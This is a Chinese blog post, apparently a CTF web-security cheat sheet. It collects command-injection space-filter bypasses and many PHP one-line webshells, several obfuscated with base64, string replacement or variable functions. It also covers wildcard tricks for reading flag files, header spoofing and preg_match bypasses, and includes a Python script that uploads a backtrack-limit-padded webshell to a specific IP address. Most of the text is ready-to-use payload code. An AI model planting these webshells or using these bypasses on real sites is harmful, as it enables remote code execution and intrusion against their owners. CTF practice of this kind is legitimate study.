---
title: 常用bypass（待更新）
description: 我是菜鸡
abbrlink: ef088674
date: 2022-10-17 21:01:13
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
typora-root-url: ..
---





# 空格

```
$IFS ${IFS}  $IFS$9
<  
>
<>
{,}
%20(空格的url编码)
%09(tab的url编码)
%0a,%0b,%0c,%0d,%a0

/**/   SQL中
括号括起来   SQL中
```

# 一句话木马

### 常规的一句话木马:

```php
<?php eval(@$_POST['a']); ?>
    
//php字符被过滤时:
<?=eval($_POST['a'])?>
```

## php短标签

```
<?=@eval($_POST['a']);?>
```



### 使用其他函数:

```php
<?php assert(@$_POST['a']); ?>
```

```php
<?php
$fun = create_function('',$_POST['a']);
$fun();
?>
```

```php
<?php
@call_user_func(assert,$_POST['a']);
?>
//这里@call_user_func可以用来调用其他函数,第一个参数是它调用的函数,第二个函数是调用函数的参数
```

```php
<?php
@preg_replace("/abcde/e", $_POST['a'], "abcdefg");
?>
//这个函数原本是利用正则表达式替换符合条件的字符串，但是这个函数有一个功能——可执行命令。
//这个函数的第一个参数是正则表达式，按照PHP的格式，表达式在两个“/”之间。如果我们在这个表达式的末尾加上“e”，那么这个函数的第二个参数就会被当作代码执行。
```

```php
<?php
$test='<?php $a=$_POST["cmd"];assert($a); ?>';
file_put_contents("Trojan.php", $test);
?>
//这里是生成一个文件,第二个参数是文件的内容
```

```php
<?php
$a='assert';
array_map("$a",$_REQUEST);
?>
//这里利用array_map()函数将执行语句进行拼接。最终实现的是assert($_REQUEST)
```

```php
<?php
$item['JON']='assert';
$array[]=$item;
$array[0]['JON']($_POST["TEST"]);
?>
```

```php
//变量函数
<?php
$a = "eval";
$a(@$_POST['a']);
?>
```

```php
//变量的嵌套
<?php
$bb="eval";
$aa="bb";
$$aa($_POST['a']);
?>
```

```php
//字符串的替换
<?php
$a=str_replace("Waldo", "", "eWaldoval");
$a(@$_POST['a']);
?>
```

```php
//base64
<?php
$a=base64_decode("ZXZhbA==")
$a($_POST['a']);
?>
```

```php
//利用.进行字符拼接
<?php
$a="e"."v";
$b="a"."l";
$c=$a.$b;
$c($_POST['a']);
?>
```

```php
<?php
$str="a=eval";
parse_str($str);
$a($_POST['a']);
?>
//parse_str生成一个变量a,其值为eval.
```

### 结合其他数据来源:

- GET:

```php
<?php $_GET[a]($_GET[b]); ?>
//a=eval&b=$_POST['a']

<?php @eval( $_GET[$_GET[b]])>
//b=cmd&cmd=phpinfo()
```



### 其他标签:

```
<script language="php">@eval_r($_GET[a]);</script>
<script language="php">@eval($_POST['a']);</script>
```





# flag

(另外,某个参数过滤的比较过分时,尝试引入其他的GET或POST参数来执行命令等)

执行系统命令时支持`*`,`?`等模糊查找,例如:

```
system("cat f*.php")
system("cat fla?.php")
system("cat fla""g.php")
tac<fla''g.php
tac%09fla''g.php
```

# 命令执行:

## 读文件(php/系统命令)

```
系统命令:
cat flag.php
more flag.php
nl flag.php
tac flag.php
grep '{' flag.php
//grep(要查找的串,目标文件),这里相当于从flag.php中查找'{',查找到后输出结果所在的行,实际上也就相当于输出了flag

php函数:
file_get_contents("文件名")
show_source()
file_get_content()
```

## 执行命令

```
执行系统命令:
system
exec
执行php命令
eval
assert
```



另外,如果系统命令无法执行, 尝试用绝对路径来执行命令,例如:

```
/bin/cat /flag.txt
```





# 大写字母/小写字母

大写字母:`[@-[]` 这里的含义是:`ASCII`码表中, 大写字母在`@`和`[`之间

那么同理,小写字母就是: 

```
[`-{]
```



# 无字母数字构建数字

Linux中:

```
$(())表示0
$((~0))表示-1 ,因此-1也可以表示为: $((~$(())))
$((~ a))= -(a+1)   例如:$((~ -40))=$((~ 40个-1))=$((~ 40个$((~$(())))  ))= 39
$((-1-1))=$(( $((~$(()))) $((~$(()))))) = -2
$((3个-1))=$(($((~$(())))$((~$(())))$((~$(()))))) = -3
.......
```

<img src="/images/bypass/image-20221017221437656.png" alt="image-20221017221437656" style="zoom:67%;" />



# XFF头字段

`XFF`头不起作用的话,可以尝试下列头字段:

```
X-Forward-For
X-client-IP
X-Real-ip
Client-IP
```



# GET,POST中的中括号

可以用花括号来代替,例如:

```
$_GET{0}
```





# php中preg_match正则匹配的绕过汇总

**常用的修饰符**

| 修饰符 | 含义                                   | 描述                                                         |
| :----- | :------------------------------------- | :----------------------------------------------------------- |
| i      | ignore - 不区分大小写                  | 将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。 |
| g      | global - 全局匹配                      | 查找所有的匹配项。                                           |
| m      | multi line - 多行匹配                  | preg_match                                                   |
| s      | 特殊字符圆点 **.** 中包含换行符 **\n** | **默认情况下的圆点 . 是匹配除换行符 `\n` 之外的任何字符，加上 s 修饰符之后, . 中包含换行符` \n`。** |

其他修饰符和具体语法见[速查](5e7d3829.html)

## 换行符绕过

在不加修饰符`s`时, `.`是不匹配换行符的

例如:

```
if (preg_match('/^.*(flag).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
}
匹配 任意多个字符+flag+任意多个字符
这里传入: $json="\nflag"  就可以绕过检测
```



在不加修饰符`m`时, 不进行多行匹配, 即使正则表达式尾部加了 用于匹配结尾的`$`, 也匹配不到结尾的换行符

```
if (preg_match('/^flag$/', $_GET['a']) && $_GET['a'] !== 'flag') {
    echo $flag;
}
这里传:a=flag%0a  就可绕过
```





## **数组绕过**

`preg_match`只能处理字符串，当传入的是数组时会返回`false`



## 回溯次数限制

`pcre.backtrack_limit`给php的正则匹配设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，`preg_match`会返回`false`

例如:

```
正则表达式为: <\?.*[(`;?>].*   
输入为: <?php phpinfo();//aaaaa
```

实际匹配时的执行流程为:

<img src="/images/bypass/12.png" alt="image-20221017221437656" style="zoom:67%;" />



见上图，可见第4步的时候，因为第一个`.*`可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是`//aaaaa`。但此时显然是不对的，因为正则显示`.*`后面还应该有一个字符需要匹配:

```
[(`;?>].* 
```

所以NFA就开始回溯，先吐出一个`a`，输入变成第5步显示的`//aaaa`，但仍然匹配不上正则，继续吐出`a`，变成`//aaa`，仍然匹配不上……

最终直到吐出`;`，输入变成第12步显示的`<?php phpinfo()`，此时，`.*`匹配的是`php phpinfo()`，而后面的`;`则匹配上则被后面的表达式匹配到，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配`;`，14步匹配`.*`，第二个`.*`匹配到了字符串末尾，最后结束匹配。

所以在上面的匹配过程中, 一共回溯了8次(第5步-第12步)

**那么如果在需要绕过的正则表达式中见到了`.*`这样的模式, 且后面还有其他模式需要匹配的, 就可以通过在输入的字符串末尾传入超长字符串的形式来触发回溯次数限制**

在对前面例子里的表达式的绕过中,就可以:

```python
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
print(res.headers)
```



## 非贪婪模式+回溯限制绕过

例如有:

```
if(preg_match('/UNION.+?SELECT/is', $input)) {
    die('SQL Injection');
}
```

`.+?`的意思为在对`.+`的匹配中,使用非贪婪模式来匹配,也就是只要有一个符合条件的字符匹配到, 就结束当前对`.+`的匹配, 向下执行其他匹配.  如果向下执行的其他匹配失败, 再回溯到此继续执行,匹配一次后再向下, 失败再回溯...

例如如果输入: `UNION/*aaaaa*/SELECT`

则匹配的过程为:

- `.+?`匹配到`/`
- 因为非贪婪模式，所以`.+?`停止匹配，而由`S`匹配`*`
- `S`匹配`*`失败，回溯，再由`.+?`匹配`*`
- 因为非贪婪模式，所以`.+?`停止匹配，而由`S`匹配`a`
- `S`匹配`a`失败，回溯，再由`.+?`匹配`a`
- ...

那么随着`a`的数量增加直到超出回溯限制 , 就能够绕过检测





















